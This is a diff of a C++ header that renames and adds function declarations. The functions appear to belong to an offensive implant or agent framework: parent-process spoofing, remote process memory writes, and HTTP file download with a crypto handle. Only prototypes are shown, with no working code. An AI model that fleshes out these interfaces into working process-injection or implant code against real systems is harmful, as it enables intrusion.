@@ -12,6 +12,12 @@
 #include "core/stdout.hpp"
 #include "core/utils.hpp"
 
+namespace System::Handle
+{
+    BOOL HandleClose(Procs::PPROCS pProcs, HANDLE handle);
+    BOOL HandleWait(Procs::PPROCS pProcs, HANDLE handle, BOOL bAlertable, PLARGE_INTEGER pTimeout);
+}
+
 namespace System::Arch
 {
     std::wstring GetName(WORD wProcessorArchitecture);
@@ -30,7 +36,7 @@ namespace System::Process
         DWORD           dwDesiredAccess, // e.g. PROCESS_ALL_ACCESS
         HANDLE          hParentProcess
     );
-    DWORD GetProcessIdByName(LPCWSTR lpProcessName);
+    DWORD ProcessGetIdByName(LPCWSTR lpProcessName);
     HANDLE ProcessOpen(
         Procs::PPROCS   pProcs,
         DWORD           dwProcessID,
@@ -51,15 +57,15 @@ namespace System::Process
     BOOL VirtualMemoryFree(
         Procs::PPROCS   pProcs,
         HANDLE 	        hProcess,
-		PVOID* 	        lpBaseAddr,
+		PVOID* 	        pBaseAddr,
 		SIZE_T 	        dwSize,
 		DWORD 	        dwFreeType
     );
     BOOL VirtualMemoryWrite(
         Procs::PPROCS   pProcs,
         HANDLE          hProcess,
-        LPVOID          lpBaseAddr,
-        LPVOID          lpBuffer,
+        PVOID           pBaseAddr,
+        PVOID           pBuffer,
 		DWORD           dwBufferSize,
         PDWORD 			lpNumberOfBytesWritten
     );
@@ -104,12 +110,12 @@ namespace System::Http
         DWORD dwStatusCode;
     };
 
-    WinHttpHandlers InitRequest(
+    WinHttpHandlers RequestInit(
         Procs::PPROCS pProcs,
         LPCWSTR lpHost,
         INTERNET_PORT nPort
     );
-    WinHttpResponse SendRequest(
+    WinHttpResponse RequestSend(
         Procs::PPROCS pProcs,
         HINTERNET hConnect,
         LPCWSTR lpHost,
@@ -124,11 +130,11 @@ namespace System::Http
         Procs::PPROCS pProcs,
         HINTERNET hRequest
     );
-    std::wstring ReadResponseText(
+    std::wstring ResponseRead(
         Procs::PPROCS pProcs,
         HINTERNET hRequest
     );
-    BOOL DownloadFile(
+    BOOL FileDownload(
         Procs::PPROCS pProcs,
         Crypt::PCRYPT pCrypt,
         HINTERNET hConnect,
